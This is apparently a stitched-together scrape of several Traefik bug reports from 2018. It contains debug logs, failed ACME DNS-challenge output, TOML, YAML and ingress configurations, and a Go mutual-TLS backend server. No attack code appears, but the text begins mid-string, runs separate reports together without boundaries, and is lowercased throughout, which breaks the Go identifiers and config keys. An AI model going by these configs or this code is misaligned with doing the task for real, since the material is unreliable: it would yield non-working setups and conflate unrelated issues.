ik-traefik\\",\\"routes\\":{\\"route-frontend-host-traefik-traefik-monitor-local-example-com-0\\":{\\"rule\\":\\"host:traefik.traefik.monitor.local.example.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2018-10-22t07:39:00z" level=info msg="server configuration reloaded on :80"
time="2018-10-22t07:39:00z" level=info msg="server configuration reloaded on :443"
time="2018-10-22t07:39:00z" level=info msg="server configuration reloaded on :8484"
time="2018-10-22t07:39:00z" level=info msg="server configuration reloaded on :8080"
time="2018-10-22t07:39:00z" level=debug msg="creating entry point redirect http -> https"
time="2018-10-22t07:39:02z" level=debug msg="wiring frontend frontend-host-alertmanager-monitor-local-example-com-3 to entrypoint https"
time="2018-10-22t07:39:02z" level=debug msg="creating backend backend-alertmanager-prometheus"
time="2018-10-22t07:39:02z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-alertmanager-monitor-local-example-com-3"
time="2018-10-22t07:39:02z" level=debug msg="creating load-balancer wrr"
time="2018-10-22t07:39:02z" level=debug msg="creating server server-alertmanager-4cb3f945666077858f35d4018dd76eaaat with weight 1"
time="2018-10-22t07:39:02z" level=debug msg="creating route route-frontend-host-alertmanager-monitor-local-example-com-3 host:alertmanager.monitor.local.example.com"
time="2018-10-22t07:39:02z" level=debug msg="wiring frontend frontend-host-metrics-monitor-local-example-com-path-cadvisor-replacepath-metrics-4 to entrypoint metrics"
time="2018-10-22t07:39:02z" level=debug msg="creating backend backend-cadvisor-cadvisor"
time="2018-10-22t07:39:02z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-metrics-monitor-local-example-com-path-cadvisor-replacepath-metrics-4"
time="2018-10-22t07:39:02z" level=debug msg="creating load-balancer wrr"
time="2018-10-22t07:39:02z" level=debug msg="creating server server-cadvisor-e42dd141b28258fda36b39d92119a422 at with weight 1"
time="2018-10-22t07:39:02z" level=debug msg="creating route route-frontend-host-metrics-monitor-local-example-com-path-cadvisor-replacepath-metrics-4 host:metrics.monitor.local.example.com;path:/cadvisor;replacepath:/metrics"
time="2018-10-22t07:39:02z" level=debug msg="wiring frontend frontend-host-metrics-monitor-local-example-com-path-node-exporter-replacepath-metrics-1 to entrypoint metrics"
time="2018-10-22t07:39:02z" level=debug msg="creating backend backend-node-exporter-node-exporter"
time="2018-10-22t07:39:02z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-metrics-monitor-local-example-com-path-node-exporter-replacepath-metrics-1"
time="2018-10-22t07:39:02z" level=debug msg="creating load-balancer wrr"
time="2018-10-22t07:39:02z" level=debug msg="creating server server-node-exporter-0fee9f2051d33a490d9f32e9bacbc888 at with weight 1"
time="2018-10-22t07:39:02z" level=debug msg="creating route route-frontend-host-metrics-monitor-local-example-com-path-node-exporter-replacepath-metrics-1 host:metrics.monitor.local.example.com;path:/node-exporter;replacepath:/metrics"
time="2018-10-22t07:39:02z" level=debug msg="wiring frontend frontend-host-monitor-local-example-com-2 to entrypoint https"
time="2018-10-22t07:39:02z" level=debug msg="creating backend backend-grafana-prometheus"
time="2018-10-22t07:39:02z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-monitor-local-example-com-2"
time="2018-10-22t07:39:02z" level=debug msg="creating load-balancer wrr"
time="2018-10-22t07:39:02z" level=debug msg="creating server server-grafana-9733510c04552af6363b3428626e564f at with weight 1"
time="2018-10-22t07:39:02z" level=debug msg="creating route route-frontend-host-monitor-local-example-com-2host:monitor.local.example.com"
time="2018-10-22t07:39:02z" level=debug msg="wiring frontend frontend-host-traefik-traefik-monitor-local-example-com-0 to entrypoint http"
time="2018-10-22t07:39:02z" level=debug msg="creating backend backend-traefik-traefik"
time="2018-10-22t07:39:02z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-traefik-traefik-monitor-local-example-com-0"
time="2018-10-22t07:39:02z" level=debug msg="creating load-balancer wrr"
time="2018-10-22t07:39:02z" level=debug msg="creating server server-traefik-780f230448df16d66397c0c29cebc062 at with weight 1"
time="2018-10-22t07:39:02z" level=debug msg="creating route route-frontend-host-traefik-traefik-monitor-local-example-com-0 host:traefik.traefik.monitor.local.example.com"
time="2018-10-22t07:39:02z" level=info msg="server configuration reloaded on :8080"
time="2018-10-22t07:39:02z" level=info msg="server configuration reloaded on :80"
time="2018-10-22t07:39:02z" level=info msg="server configuration reloaded on :443"
time="2018-10-22t07:39:02z" level=info msg="server configuration reloaded on :8484"
time="2018-10-22t07:39:02z" level=debug msg="try to challenge certificate for domain [monitor.local.example.com] founded in host rule"
time="2018-10-22t07:39:02z" level=debug msg="try to challenge certificate for domain [alertmanager.monitor.local.example.com] founded in host rule"
time="2018-10-22t07:39:02z" level=debug msg="looking for provided certificate(s) to validate [\\"alertmanager.monitor.local.example.com\\"]..."
time="2018-10-22t07:39:02z" level=debug msg="no acme certificate generation required for domains [\\"alertmanager.monitor.local.example.com\\"]."
time="2018-10-22t07:39:02z" level=debug msg="looking for provided certificate(s) to validate [\\"monitor.local.example.com\\"]..."
time="2018-10-22t07:39:02z" level=debug msg="no acme certificate generation required for domains [\\"monitor.local.example.com\\"]."
time="2018-10-22t07:39:03z" level=debug msg="building acme client..."
time="2018-10-22t07:39:03z" level=debug msg=" "
time="2018-10-22t07:39:03z" level=info msg=register...
time="2018-10-22t07:39:03z" level=info msg="legolog: [info] acme: registering account for email@example.com"
time="2018-10-22t07:39:03z" level=debug msg="using dns challenge provider: digitalocean"
time="2018-10-22t07:39:03z" level=info msg="legolog: [info] [*.monitor.local.example.com, monitor.local.example.com] acme: obtaining bundled san certificate"
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [*.monitor.local.example.com] authurl: "
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [monitor.local.example.com] authurl: "
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [monitor.local.example.com] acme: could not find solver for: http-01"
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [monitor.local.example.com] acme: could not find solver for: tls-alpn-01"
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [monitor.local.example.com] acme: preparing to solve dns-01"
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [monitor.local.example.com] acme: preparing to solve dns-01"
time="2018-10-22t07:39:04z" level=error msg="error obtaining certificate retrying in 439.762423ms"
time="2018-10-22t07:39:04z" level=info msg="legolog: [info] [*.monitor.local.example.com, monitor.local.example.com] acme: obtaining bundled san certificate"
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [*.monitor.local.example.com] authurl: "
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [monitor.local.example.com] authurl: "
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [monitor.local.example.com] acme: could not find solver for: http-01"
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [monitor.local.example.com] acme: could not find solver for: tls-alpn-01"
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [monitor.local.example.com] acme: preparing to solve dns-01"
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [monitor.local.example.com] acme: preparing to solve dns-01"
time="2018-10-22t07:39:05z" level=error msg="error obtaining certificate retrying in 415.556797ms"
time="2018-10-22t07:39:05z" level=info msg="legolog: [info] [*.monitor.local.example.com, monitor.local.example.com] acme: obtaining bundled san certificate"
time="2018-10-22t07:39:06z" level=info msg="legolog: [info] [*.monitor.local.example.com] authurl: "
time="2018-10-22t07:39:06z" level=info msg="legolog: [info] [monitor.local.example.com] authurl: "
time="2018-10-22t07:39:06z" level=info msg="legolog: [info] [monitor.local.example.com] acme: could not find solver for: http-01"
time="2018-10-22t07:39:06z" level=info msg="legolog: [info] [monitor.local.example.com] acme: could not find solver for: tls-alpn-01"
time="2018-10-22t07:39:06z" level=info msg="legolog: [info] [monitor.local.example.com] acme: preparing to solve dns-01"
time="2018-10-22t07:39:06z" level=info msg="legolog: [info] [monitor.local.example.com] acme: preparing to solve dns-01"
time="2018-10-22t07:39:06z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [monitor.local.example.com] error presenting token: digitalocean: could not determine zone for domain: \'monitor.local.example.com\'
unexpected response code \'notimpl\' for monitor.local.example.com.\ "
time="2018-10-22t07:39:06z" level=error msg="unable to obtain acme certificate for domains \\"*.monitor.local.example.com,monitor.local.example.com\\" : unable to generate a certificate for the domains [*.monitor.local.example.com monitor.local.example.com]: acme: error -> one or more domains had a problem:\ [monitor.local.example.com] error presenting token: digitalocean: could not determine zone for domain: \'monitor.local.example.com\'
unexpected response code \'notimpl\' for monitor.local.example.com.\ "
```toml loglevel = "info" insecureskipverify = true defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [entrypoints.prometheus] address = ":9120" compress = true [entrypoints.ping] address = ":81" [entrypoints.dashboard] address = ":8080" compress = true [ping] entrypoint = "ping" [kubernetes] [kubernetes.ingressendpoint] publishedservice = "kube-system/ingress-traefik" [acme] email = "my@email.com" storage = "/acme/acme.json" entrypoint = "https" onhostrule = true acmelogging = true [acme.dnschallenge] provider = "route53" [api] dashboard = true entrypoint = "dashboard" # metrics definition [metrics] [metrics.prometheus] entrypoint = "prometheus"
``` ### additional context this issue was first reported in #1957 and a solution was proposed in #3631, released as 1.7 since then, this issue was reported multiple times (#3876, #3999), but got closed automatically by the @traefiker bot without any response at all
i really hope it won't get closed again.
```toml ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
ubuntu 18.04 docker version 18.06.1-ce, build e68fc7a
swarm with 3 nodes, all nodes are manager
same environment/configuration as in #4005, but with 1.7.3 versions of docker hub image
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ``` ```
#### traefik config traefik is deployed as a daemonset
* image: registry.hub.docker.com/library/traefik:v1.7.2-alpine
* config: arguments:
``` - --debug - --api - --kubernetes - --loglevel=debug - --entrypoints=name:http address::80 - --entrypoints=name:https address::443 tls:/app/certs/srv/crt.pem,/app/certs/srv/key.pem ca:/app/certs/ca/crt.pem - --kubernetes.enablepasstlscert=true
``` #### ingress ```yml
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: kubernetes.io/ingress.class: traefik traefik.frontend.entrypoints: "https" traefik.ingress.kubernetes.io/pass-tls-cert: "true" #ingress.kubernetes.io/passtlsclientcert: "true" #traefik.frontend.passtlsclientcert.pem: "true"
``` #### certificates i created a custom ca and derived from it a server and client certificate
#### backend server code ```go
package main import ( "crypto/tls" "crypto/x509" "fmt" "io/ioutil" "net/http" "net/http/httputil"
) func main() { cacert, _ := ioutil.readfile("/app/certs/ca/crt.pem") capool := x509.newcertpool() capool.appendcertsfrompem(cacert) tlsconfig := &tls.config{ clientauth: tls.requireandverifyclientcert, clientcas: capool, } tlsconfig.buildnametocertificate() http.handlefunc("/", func(w http.responsewriter, req *http.request) { reqdump, _ := httputil.dumprequest(req,true) fmt.fprintf( w, "cert/subject: %v (%d)\ ", req.tls.peercertificates[0].subject, req.tls.peercertificates[0].serialnumber, ) fmt.fprintf( w, string(reqdump), ) }) httpserver := &http.server{ addr: ":8080", tlsconfig: tlsconfig, } httpserver.listenandservetls( "/app/certs/server/crt.pem", "/app/certs/server/key.pem", )
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) complete log attached
snippets: ```
time="2018-10-15t13:38:41z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":null,\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"https\\":{\\"address\\":\\":443\\",\\"tls\\":{\\"minversion\\":\\"\\",\\"ciphersuites\\":null,\\"certificates\\":[{\\"certfile\\":\\"/app/certs/srv/crt.pem\\",\\"keyfile\\":\\"/app/certs/srv/key.pem\\"}],\\"clientcafiles\\":null,\\"clientca\\":{\\"files\\":[\\"/app/certs/ca/crt.pem\\"],\\"optional\\":false},\\"defaultcertificate\\":{\\"certfile\\":\\"/app/certs/srv/crt.pem\\",\\"keyfile\\":\\"/app/certs/srv/key.pem\\"},\\"snistrict\\":false},\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"web\\":null,\\"docker\\":null,\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":true,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":null},\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":true,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":null,\\"ping\\":null,\\"hostresolver\\":null}"
time="2018-10-15t13:38:41z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"cert-experiments.cern.ch/gb\\":{\\"servers\\":{\\"ircrelay-glowingbear-744bc84b9d-5ll62\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"cert-experiments.cern.ch/traefik-ui\\":{\\"servers\\":{\\"ingress-traefik-ghdmc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"cert-experiments.cern.ch/weechat\\":{\\"servers\\":{\\"ircrelay-weechat-6585bbcfff-zqbp6\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"server\\":{\\"servers\\":{\\"server-app\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"cert-experiments.cern.ch/gb\\":{\\"entrypoints\\":[\\"https\\"],\\"backend\\":\\"cert-experiments.cern.ch/gb\\",\\"routes\\":{\\"/gb\\":{\\"rule\\":\\"pathprefixstrip:/gb\\"},\\"cert-experiments.cern.ch\\":{\\"rule\\":\\"host:cert-experiments.cern.ch\\"}},\\"passhostheader\\":true,\\"passtlscert\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"cert-experiments.cern.ch/traefik-ui\\":{\\"entrypoints\\":[\\"https\\"],\\"backend\\":\\"cert-experiments.cern.ch/traefik-ui\\",\\"routes\\":{\\"/traefik-ui\\":{\\"rule\\":\\"pathprefixstrip:/traefik-ui\\"},\\"cert-experiments.cern.ch\\":{\\"rule\\":\\"host:cert-experiments.cern.ch\\"}},\\"passhostheader\\":true,\\"passtlscert\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"cert-experiments.cern.ch/weechat\\":{\\"entrypoints\\":[\\"https\\"],\\"backend\\":\\"cert-experiments.cern.ch/weechat\\",\\"routes\\":{\\"/weechat\\":{\\"rule\\":\\"pathprefixstrip:/weechat\\"},\\"cert-experiments.cern.ch\\":{\\"rule\\":\\"host:cert-experiments.cern.ch\\"}},\\"passhostheader\\":true,\\"passtlscert\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"server\\":{\\"entrypoints\\":[\\"https\\"],\\"backend\\":\\"server\\",\\"routes\\":{\\"server\\":{\\"rule\\":\\"host:server\\"}},\\"passhostheader\\":true,\\"passtlscert\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
``` [traefik.log](
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "hostresolver": null, "configfile": ""
i use the latest kubernetes version v1.12.1 on ubuntu 18.04
we're using docker swarm and have the following argument overrides in our deploy file: ```yaml
command: - --docker.domain=${domain} - --retry - --retry.attempts=3 - --accesslog.filters.retryattempts=true
``` and the following `traefik.toml`
loglevel = "warn"
defaultentrypoints = ["http"] [traefiklog]
format = "json" [accesslog]
format = "json" [accesslog.filters] # # statuscodes = ["200-299", "400-499", "500-599"] # statuscodes = ["400-499", "500-599"] statuscodes = ["500-599"] # connection to docker host system (docker.sock)
watch = true
# this will hide all docker containers that don't have explicitly
# set label to "enable"
exposedbydefault = false
# can be overridden for local development
swarmmode = true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.ping] address = ":8081" [lifecycle]
requestacceptgracetimeout = "20s"
gracetimeout = "10s" # to enable traefik to export internal metrics to prometheus
[metrics] [metrics.prometheus] # name of the related entry point # # optional # default: "traefik" # entrypoint = "traefik" # buckets for latency metrics # # optional # default: [0.1, 0.3, 1.2, 5] buckets = [0.1,0.3,1.2,5.0] [ping] # name of the related entry point # # optional # default: "traefik" # entrypoint = "ping"
``` our docker version is: ```
client: version: 18.06.1-ce api version: 1.38 go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:20:43 2018 os/arch: linux/amd64 experimental: false server: engine: version: 18.06.1-ce api version: 1.38 (minimum version 1.12) go version: go1.10.3 git commit: e68fc7a built: tue aug 21 17:16:31 2018 os/arch: linux/amd64 experimental: true
``` we're running our swarm on container linux: ```
name="container linux by coreos"
version=1855.4.0
version_id=1855.4.0
build_id=2018-09-11-0003
pretty_name="container linux by coreos 1855.4.0 (rhyolite)"
coreos_board="amd64-usr"
``` the backend in question is the `address-api`
### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
{"level":"error","msg":"recovered from panic in http handler: runtime error: invalid memory address or nil pointer dereference","time":"2018-10-11t19:24:04z"}
{"level":"error","msg":"recovered from panic in http handler: runtime error: invalid memory address or nil pointer dereference","time":"2018-10-11t20:08:10z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000 traefik.backend.loadbalancer.swarm:true]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[com.docker.stack.image:updater/apps-schema-registry:57393 com.docker.stack.namespace:apps traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[com.docker.stack.image:updater/moveiq-api:57094 com.docker.stack.namespace:moveiq traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"filtering disabled container moveiq_reservation.3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"filtering disabled container moveiq_reservation.2","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"filtering disabled container moveiq_reservation.1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.port:8080 traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:8080 com.docker.stack.image:updater/rover-state-observer:56756 com.docker.stack.namespace:rover traefik.backend.loadbalancer.swarm:true]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.enable:true traefik.port:8080 traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[com.docker.stack.image:updater/rover-flow-controller:56918 com.docker.stack.namespace:rover traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:8080]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"alllabelsmap[:map[traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000 traefik.backend.loadbalancer.swarm:true]]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"originlabelsmap[com.docker.stack.image:updater/utility-api:56192 com.docker.stack.namespace:utility traefik.backend.loadbalancer.swarm:true traefik.docker.network:gateway_public-network traefik.enable:true traefik.port:3000]","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"network not found, id: 1snbkqadpw5bcx5e8qjibxx21","time":"2018-10-11t20:08:09z"}
{"level":"info","msg":"server configuration reloaded on :8081","time":"2018-10-11t20:08:09z"}
{"level":"info","msg":"server configuration reloaded on :80","time":"2018-10-11t20:08:09z"}
{"level":"info","msg":"server configuration reloaded on :8080","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-utility-api-sandbox-updatron-com-0 host:utility-api.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-utility-api-76f981efd58bc6c2368214b14347ef47 at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-utility-api-sandbox-updatron-com-0","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-utility-api","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-utility-api-sandbox-updatron-com-0 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-rover-state-observer-sandbox-updatron-com-2 host:rover-state-observer.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-rover-state-observer-fca84cdd216f828a248f6eaf8d596efe at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-rover-state-observer-sandbox-updatron-com-2","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-rover-state-observer","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-rover-state-observer-sandbox-updatron-com-2 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-rover-flow-controller-sandbox-updatron-com-1 host:rover-flow-controller.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-rover-flow-controller-b514fdf430ae35d825d73358b1d148e1 at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-rover-flow-controller-sandbox-updatron-com-1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-rover-flow-controller","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-rover-flow-controller-sandbox-updatron-com-1 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-property-api-sandbox-updatron-com-7 host:property-api.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-property-api-dfc2c742d71e4c5cb8ca8e9d4a0886f9 at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-property-api-sandbox-updatron-com-7","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-property-api","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-property-api-sandbox-updatron-com-7 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-moveiq-api-sandbox-updatron-com-3 host:moveiq-api.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-moveiq-api-77f55147b12732c79e420317cd2113c2 at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-moveiq-api-sandbox-updatron-com-3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-moveiq-api","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-moveiq-api-sandbox-updatron-com-3 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-homeservices-api-sandbox-updatron-com-5 host:homeservices-api.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-homeservices-api-8104d5f032d5228ae914880adbd8061d at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-homeservices-api-sandbox-updatron-com-5","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-homeservices-api","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-homeservices-api-sandbox-updatron-com-5 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-apps-schema-registry-sandbox-updatron-com-4 host:apps-schema-registry.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-apps-schema-registry-50a217b7fb8fd5535885d1d982f40686 at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"adding tlsclientheaders middleware for frontend frontend-host-apps-schema-registry-sandbox-updatron-com-4","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating backend backend-apps-schema-registry","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"wiring frontend frontend-host-apps-schema-registry-sandbox-updatron-com-4 to entrypoint http","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating route route-frontend-host-address-api-sandbox-updatron-com-6 host:address-api.sandbox.updatron.com","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"setting up buffering: request limits: 0 (mem), 0 (max), response limits: 0 (mem), 0 (max) with retry: \'(isnetworkerror() || responsecode() == 502) \\u0026\\u0026 attempts() \\u003c= 1\'","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating retries max attempts 3","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating server server-address-api-772a04eb7a285cf6dc59117b66b32878 at with weight 1","time":"2018-10-11t20:08:09z"}
{"level":"debug","msg":"creating load-balancer wrr","time":"2018-10-11t20:08:09z"}
